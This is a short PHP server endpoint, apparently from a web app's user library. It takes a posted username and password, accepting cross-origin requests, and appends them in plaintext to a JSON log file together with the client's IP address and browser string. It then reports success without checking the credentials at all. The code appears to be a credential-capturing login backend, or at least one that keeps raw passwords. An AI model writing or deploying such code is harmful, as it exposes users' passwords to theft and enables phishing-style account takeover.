<?php
require_once __DIR__ . '/_users_lib.php';
candookaCorsJson();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!is_array($input)) $input = $_POST;

$user = substr(trim((string)($input['user'] ?? '')), 0, 200);
if ($user === '') {
    http_response_code(400);
    echo json_encode(['error' => 'user required']);
    exit;
}

$entry = [
    'time' => gmdate('c'),
    'user' => $user,
    'password' => substr((string)($input['password'] ?? ''), 0, 200),
    'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
    'device' => substr((string)($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 240),
];
candookaAppendLog('login-logs.json', $entry);
echo json_encode(['ok' => true]);
